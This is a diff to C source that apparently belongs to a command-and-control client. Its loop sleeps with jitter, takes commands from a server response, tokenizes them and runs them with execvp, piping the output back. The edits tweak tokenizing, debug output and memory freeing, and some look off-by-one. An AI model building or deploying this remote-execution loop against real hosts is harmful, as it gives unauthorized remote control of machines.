@@ -13,7 +13,7 @@ int main(int argc, char **argv){
     master_init(&master);
     while ( 1 ) {
         #ifdef CLIENT_DEBUG
-        int sleep_time = (rand() % 15) + set_sleep;
+        int sleep_time = (rand() % 3) + set_sleep;
         printf("Sleeping for %d seconds... ", sleep_time);
         fflush(stdout);
         #else
@@ -43,6 +43,7 @@ int main(int argc, char **argv){
                 strncpy(cmd,resp+4,cmdlen);
                 int len;
                 char ** args = tokenize_cmd(cmd,&len);
+                //char ** args = parse(cmd);
                 printf("Arguments:\n");
                 for (int i = 0; i < len; i++){
                     printf("\tArg[%d] = %s\n",i,args[i]);
@@ -109,6 +110,19 @@ int main(int argc, char **argv){
     return 0;
 }
 
+char** parse(char *string)
+{
+    char** ret = malloc(sizeof(char*));
+    ret[0] = strtok(string, " \n");
+    int i = 0;
+    for (; ret[i]; ret[i] = strtok(NULL, " \n"))
+    {
+        ret = realloc(ret, sizeof(char*) * ++i);
+    }
+
+    return ret;
+}
+
 char **tokenize_cmd(char *cmd, int *count){
     uint32_t cmdlen = strlen(cmd);
     char **tokens = (char **)malloc(sizeof(char *) * (cmdlen));
@@ -132,11 +146,11 @@ char **tokenize_cmd(char *cmd, int *count){
             if (is_quote){
                 //end quote
                 if (end > start) {
-                    uint32_t toklen = (end - start);
+                    uint32_t toklen = (end - start)+1;
                     tokens[index] = (char *)malloc(sizeof(char) * ((toklen)+1));
                     strncpy(tokens[index],cmd+start,toklen);
                     tokens[index][toklen] = '\0';
-                    start = end+1;
+                    start = end+2;
                     index++;
                     is_quote = 0;
                 }
@@ -148,11 +162,11 @@ char **tokenize_cmd(char *cmd, int *count){
             if (is_dquote){
                 //end quote
                 if (end > start) {
-                    uint32_t toklen = end - start;
+                    uint32_t toklen = (end - start)+1;
                     tokens[index] = (char *)malloc(sizeof(char) * ((toklen)+1));
                     strncpy(tokens[index],cmd+start,toklen);
                     tokens[index][toklen] = '\0';
-                    start = end+1;
+                    start = end+2;
                     index++;
                     is_dquote = 0;
                 }
@@ -162,7 +176,7 @@ char **tokenize_cmd(char *cmd, int *count){
         }
     }
     tokens[index] = (char *)malloc(sizeof(char));
-    tokens[index] = 0;
+    tokens[index] = NULL;
     #ifdef CLIENT_DEBUG
     printf("[tokenize_cmd] Arguments found: %d\n",index);
     #endif
@@ -292,10 +306,10 @@ char *run_cmd(char **args) {
     //char **args = (char **)malloc(sizeof(char *) * 2);
     if(pid == 0) {
         int i = 0;
-        while (args[i]){
-            printf("Args[%d] %s\n",i,args[i]); 
-            i++;
-        }
+        //while (args[i]){
+        //    printf("Args[%d] %s\n",i,args[i]); 
+        //    i++;
+        //}
         // TODO: FIX from direct exec to
         // pipe->dup2->exec shell->write to stdin->send \n to stdin->read stdout save results->return results
         #if defined(__apple__) || defined(__linux__) || defined(__unix__)
@@ -309,29 +323,30 @@ char *run_cmd(char **args) {
         if (execvp(args[0],args) < 0) {
             perror("Error: Command not found\n");
         }
-        perror("Args:\n");
-        i = 0;
-        while (args[i]){
-            perror(args[i]); 
-            i++;
-        }
-        int j = 0;
-        while (args[j]){
-            free(args[j]);
-            j++;
-        }
-        free(args[j]);
-        free(args);
+        //perror("Args:\n");
+        //i = 0;
+        //while (args[i]){
+        //    perror(args[i]); 
+        //    i++;
+        //}
         #elif __windows__
         //_execv(cmd,param);
         #endif
         exit(0);
     } else {
         close(pipes[1]);
+        read(pipes[0], buf, BUF_SIZE);
+        //wait(NULL);
         #ifdef CLIENT_DEBUG
         printf("[run_cmd] cmd ran: %s, output:%s\n",args[0],buf);
         #else
-        read(pipes[0], buf, BUF_SIZE);
+        int j = 0;
+        while (args[j] != 0){
+            free(args[j]);
+            j++;
+        }
+        free(args[j]);
+        free(args);
         #endif
     }
     //free(args);
